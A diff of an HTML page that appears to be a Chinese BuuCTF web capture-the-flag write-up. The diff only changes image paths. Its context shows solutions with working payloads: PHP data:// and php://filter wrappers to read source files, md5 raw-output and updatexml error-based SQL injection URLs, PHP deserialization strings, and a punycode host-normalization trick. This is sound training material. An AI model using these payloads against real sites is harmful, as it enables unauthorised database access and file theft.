@@ -409,7 +409,7 @@ if (isset($_POST[&#39;password&#39;])) {
 <h1 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h1><p><strong>解题方法</strong></p>
 <p>文件扫描</p>
 <pre><code>python3 dirsearch.py -u http://f1658aa4-f3d6-4a32-8f19-7364b8a64e13.node3.buuoj.cn/ -e php</code></pre>
-<p><img src="/BuuCTF-Web-writeup-%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86.htm/image-20200727201101600.png" alt="image-20200727201101600"></p>
+<p><img src="/image-20200727201101600.png" alt="image-20200727201101600"></p>
 <p><strong>代码审计</strong></p>
 <pre><code class="php">&lt;?php
 include &quot;flag.php&quot;;
@@ -472,7 +472,7 @@ else{
 <p>0x02 利用反序列化漏洞</p>
 <p><strong>解题方法</strong></p>
 <p>构造payload<code>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</code>或者利用burpsuite结合<code>php://input</code>的方法绕过a处</p>
-<p><img src="/BuuCTF-Web-writeup-%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86.htm/image-20200728155621286.png" alt="image-20200728155621286"></p>
+<p><img src="/image-20200728155621286.png" alt="image-20200728155621286"></p>
 <p><strong>如果使用php://input必须使用burpsuite</strong>，因为hackbar不对无参数名的值进行处理</p>
 <p>构造payload<code>/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</code>之后base64解码获得unless.php源码</p>
 <pre><code class="php">&lt;?php
@@ -507,7 +507,7 @@ O%3A4%3A%22Flag%22%3A1%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3B%7D</c
 <p><code>F12</code>查看响应头</p>
 <pre><code>Hint: select * from &#39;admin&#39; where password=md5($pass,true)</code></pre>
 <p><strong>解题方法</strong></p>
-<p><img src="/BuuCTF-Web-writeup-%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86.htm/image-20200728110619421.png" alt="image-20200728110619421"></p>
+<p><img src="/image-20200728110619421.png" alt="image-20200728110619421"></p>
 <p>实验吧原题，令<code>$pass = ffifdyop</code>其原始二进制为<code>&#39;or&#39;6\xc9]\x99\xe9!r,\xf9\xedb\x1c</code></p>
 <p>此时sql语句如下</p>
 <pre><code class="php">$sql = &quot;SELECT * FROM admin WHERE password = &#39;&#39;or&#39;6�]��!r,��b&#39;&quot;;</code></pre>
@@ -647,7 +647,7 @@ public class FlagController extends HttpServlet {
 </ul>
 <h1 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h1><p><strong>解题方法</strong></p>
 <p>简单测试后可以判断存在过滤，fuzz后决定采用updatexml报错注入</p>
-<img src="/BuuCTF-Web-writeup-%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86.htm/image-20200728164134048.png" alt="image-20200728164134048" style="zoom:50%;">
+<img src="/image-20200728164134048.png" alt="image-20200728164134048" style="zoom:50%;">
 
 <p>查看数据表名</p>
 <pre><code>/check.php?username=admin&#39;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))%23&amp;password=1</code></pre>
@@ -874,13 +874,13 @@ O:11:&quot;FileHandler&quot;:3:{s:15:&quot;\00FileHandler\00op&quot;;i:2;s:11:&q
 <li><code>public</code>变量不加前缀</li>
 </ul>
 <h2 id="php反序列化数据完整性所触发的bug"><a href="#php反序列化数据完整性所触发的bug" class="headerlink" title="php反序列化数据完整性所触发的bug"></a>php反序列化数据完整性所触发的bug</h2><p>这题在本地测试时发现一个好玩的地方，输入<code>?str=O:11:&quot;FileHandler&quot;:2:{s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;}</code>并不会回显flag</p>
-<p><img src="/BuuCTF-Web-writeup-%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86.htm/image-20200731110303747.png" alt="image-20200731110303747"></p>
+<p><img src="/image-20200731110303747.png" alt="image-20200731110303747"></p>
 <p>但删除部分payload后回显flag</p>
-<p><img src="/BuuCTF-Web-writeup-%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86.htm/image-20200731110448934.png" alt="image-20200731110448934"></p>
+<p><img src="/image-20200731110448934.png" alt="image-20200731110448934"></p>
 <p>原因是因为<strong>正确的和存在错误的反序列化数据会导致读文件的时候工作目录不一样，此处错误数据读的是相对路径，完整数据读绝对路径</strong></p>
 <p>修改<code>filename</code>为绝对路径，之后构造payload进行测试</p>
 <pre><code class="php">public  $filename = &quot;/Library/WebServer/Documents/BuuCTF/AreUSerialz/flag.php&quot;;</code></pre>
-<p><img src="/BuuCTF-Web-writeup-%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86.htm/image-20200731110748339.png" alt="image-20200731110748339"></p>
+<p><img src="/image-20200731110748339.png" alt="image-20200731110748339"></p>
 <h1 id="BJDCTF-2nd-old-hack"><a href="#BJDCTF-2nd-old-hack" class="headerlink" title="[BJDCTF 2nd]old-hack"></a>[BJDCTF 2nd]old-hack</h1><p><strong>题目提示</strong></p>
 <pre><code>Powered By THINKPHP5</code></pre>
 <p><strong>解题方法</strong></p>
@@ -1007,11 +1007,11 @@ def getUrl():
 <ul>
 <li>Unicode进行字符标准化</li>
 </ul>
-<p><img src="/BuuCTF-Web-writeup-%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86.htm/16.png"></p>
+<p><img src="/16.png"></p>
 <ul>
 <li>punycode转写为ASCII</li>
 </ul>
-<p><img src="/BuuCTF-Web-writeup-%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86.htm/17.png"></p>
+<p><img src="/17.png"></p>
 <p><strong>Q.What happens if we perform ToASCII against this?</strong></p>
 <p><code>https://evil.c℆.Example.com</code></p>
 <p>**A.It normalizes to **<code>https://evil.cc/u.Example.com</code></p>
@@ -1051,7 +1051,7 @@ def getUrl():
 <p>某教程的描述</p>
 <p><code>chr() 用一个范围在 range（256）内的（就是0～255）整数作参数，返回一个对应的字符</code></p>
 <p><strong>python文档的描述</strong></p>
-<p><img src="/BuuCTF-Web-writeup-%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86.htm/18.png"></p>
+<p><img src="/18.png"></p>
 <p><strong>poc</strong></p>
 <pre><code class="python">&gt;&gt;&gt; chr(10000)
 &#39;✐&#39;
